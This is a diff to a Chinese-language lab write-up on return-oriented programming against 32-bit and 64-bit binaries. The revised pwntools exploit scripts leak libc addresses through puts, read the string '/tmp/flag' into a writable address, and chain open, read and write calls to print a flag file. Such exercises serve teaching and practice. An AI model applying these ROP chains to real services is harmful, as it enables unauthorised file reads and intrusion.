@@ -126,7 +126,7 @@ libc的基地址：0xf7c00000
 
 ![image-20230421154836525](assets/image-20230421154836525.png)
 
-可写入数据的地址：选择0x804c700
+可写入数据的地址writable_addr：选择0x804c700
 
 ![image-20230421154915184](assets/image-20230421154915184.png)
 
@@ -138,30 +138,36 @@ libc内PPPR偏移地址：0x4cab8
 
 ![image-20230421155130288](assets/image-20230421155130288.png)
 
-将/tmp/flag\0写入栈内，查看其在栈内的地址:0xffffcfd0
-
-![image-20230421155826850](assets/image-20230421155826850.png)
+从标准输入中读入/tmp/flag字符串，写入writable_addr内
 
 ### 1.1.2 payload构造
 
-1. fileName + 长度为(72 - len(fileName))的填充字符
-2. 调用open("/tmp/flag", 0)
+1. 长度为76的填充字符
+2. 调用read(0, writable_addr, len("/tmp/flag"))
+   1. read函数地址
+   2. PPPR
+   3. 0
+   4. writable_addr
+   5. len("/tmp/flag")
+3. 调用open("/tmp/flag", 0)
    1. open函数地址
    2. PPR
-   3. string_addr
+   3. writable_addr
    4. 0
-3. 调用read(3, writable_addr, 10)
+4. 调用read(3, writable_addr, 10)
    1. read函数地址
    2. PPPR
    3. 3
    4. writable_addr
    5. 10
-4. 调用write(1, writable_addr, 10)
+5. 调用write(1, writable_addr, 10)
    1. write函数地址
    2. PPPR
    3. 1
    4. writable_addr
    5. 10
+
+**最后从标准输入中写入/tmp/flag字符串**
 
 ### 1.1.3 完整代码
 
@@ -181,16 +187,20 @@ PPR = base_addr + 0x3958a
 PPPR = base_addr + 0x4cab8
 # write the flag to the writable_addr
 writable_addr = 0x804c700
-# string_addr = "/tmp/flag"
-string_addr = 0xffffcfd0
-# fileName
-fileName = b'/tmp/flag\0' 
-payload = fileName + cyclic(76 - len(fileName)) 
+# payload
+payload = cyclic(76) 
+# read the "/tmp/flag" into the writable_addr
+# read(0, writable_addr, len("/tmp/flag"))
+payload += p32(base_addr + libc.symbols['read'])
+payload += p32(PPPR)
+payload += p32(0)
+payload += p32(writable_addr)
+payload += p32(len("/tmp/flag"))
 # open the /tmp/flag
 # open("/tmp/flag", 0)
 payload += p32(base_addr + libc.symbols['open'])
 payload += p32(PPR)
-payload += p32(string_addr)
+payload += p32(writable_addr)
 payload += p32(0)
 # read the flag
 # read(3, writable_addr, 10)
@@ -210,10 +220,8 @@ payload += p32(10)
 
 # gdb.attach(io, "b *(start+163)") # we can raise a debug interface here
 io.sendafter(b'Password:', payload)
+io.sendline(b'/tmp/flag')
 io.interactive()
-
-
-
 ```
 
 ### 1.1.4 实验结果
@@ -232,7 +240,7 @@ PR地址：0x0804901e
 
 ![image-20230421161917408](assets/image-20230421161917408.png)
 
-可写入数据的地址：选择0x804c700
+可写入数据的地址writable_addr：选择0x804c700
 
 ![image-20230421154915184](assets/image-20230421154915184.png)
 
@@ -244,14 +252,17 @@ libc内PPPR偏移地址：0x4cab8
 
 ![image-20230421155130288](assets/image-20230421155130288.png)
 
+从标准输入中读入/tmp/flag字符串，写入writable_addr内
+
 ### 1.2.2 payload构造
 
 1. 通过调用puts函数，输出puts函数的地址，计算libc的基地址
-2. 通过puts函数输出environ变量的值
-3. 通过environ变量的值和偏移值，计算出栈中/tmp/flag字符串地址
-4. 调用open("/tmp/flag", 0)
-5. 调用read(3, writable_addr, 10)
-6. 调用write(1, writable_addr, 10)
+2. 调用read(0, writable_addr, len("/tmp/flag"))
+3. 调用open("/tmp/flag", 0)
+4. 调用read(3, writable_addr, 10)
+5. 调用write(1, writable_addr, 10)
+
+**最后从标准输入中写入/tmp/flag字符串**
 
 ### 1.2.3 完整代码
 
@@ -282,30 +293,22 @@ io.sendlineafter(b'Password:', payload)
 io.recvuntil(b'Password!\n')
 puts_addr = u32(io.recv(4))
 base_addr = puts_addr - libc.symbols['puts']
-print('puts_addr = ', hex(puts_addr))
-print('base_addr = ', hex(base_addr))
-# 2: get the stack address and calculate the address of string
-environ = base_addr + libc.symbols['environ']
+# print('puts_addr = ', hex(puts_addr))
+# print('base_addr = ', hex(base_addr))
+# 2: get the flag
 payload = cyclic(76) 
-payload += p32(elf.plt['puts'])
-payload += p32(PR)
-payload += p32(environ)
-payload += p32(elf.symbols['start'])
-io.sendlineafter(b'Password:', payload)
-io.recvuntil(b'Password!\n')
-stack_addr = u32(io.recv(4))
-print('stack_addr = ', hex(stack_addr))
-# 3: get the address of string and calculate the address of writable_addr
-string_addr = stack_addr - 284
-print('string_addr = ', hex(string_addr))
-# 4: get the flag
-fileName = b'/tmp/flag\0' 
-payload = fileName + cyclic(76 - len(fileName)) 
+# read the "/tmp/flag" into the writable_addr
+# read(0, writable_addr, len("/tmp/flag"))
+payload += p32(base_addr + libc.symbols['read'])
+payload += p32(base_addr + PPPR)
+payload += p32(0)
+payload += p32(writable_addr)
+payload += p32(len("/tmp/flag"))
 # open the /tmp/flag
 # open("/tmp/flag", 0)
 payload += p32(base_addr + libc.symbols['open'])
 payload += p32(base_addr + PPR)
-payload += p32(string_addr)
+payload += p32(writable_addr)
 payload += p32(0)
 # read the flag
 # read(3, writable_addr, 10)
@@ -321,9 +324,9 @@ payload += p32(base_addr + PPPR)
 payload += p32(1)
 payload += p32(writable_addr)
 payload += p32(10)
-io.sendafter(b'Password:', payload)
+io.sendlineafter(b'Password:', payload)
+io.sendlineafter(b'!', b'/tmp/flag')
 io.interactive()
-
 ```
 
 ### 1.2.4 实验结果
@@ -368,9 +371,7 @@ libc内poprdx_ret的偏移地址为0xfdd4d
 
 ![image-20230421164837262](assets/image-20230421164837262.png)
 
-将/tmp/flag\0写入栈内，查看其在栈内的地址:0x7fffffffde00
-
-![image-20230421165150346](assets/image-20230421165150346.png)
+从标准输入中读入/tmp/flag字符串，写入writable_addr内
 
 ### 2.1.2 payload构造
 
@@ -397,6 +398,8 @@ libc内poprdx_ret的偏移地址为0xfdd4d
    5. poprdx_ret
    6. 10
    7. write函数地址
+
+**最后从标准输入中写入/tmp/flag字符串**
 
 ### 2.1.3 完整代码
 
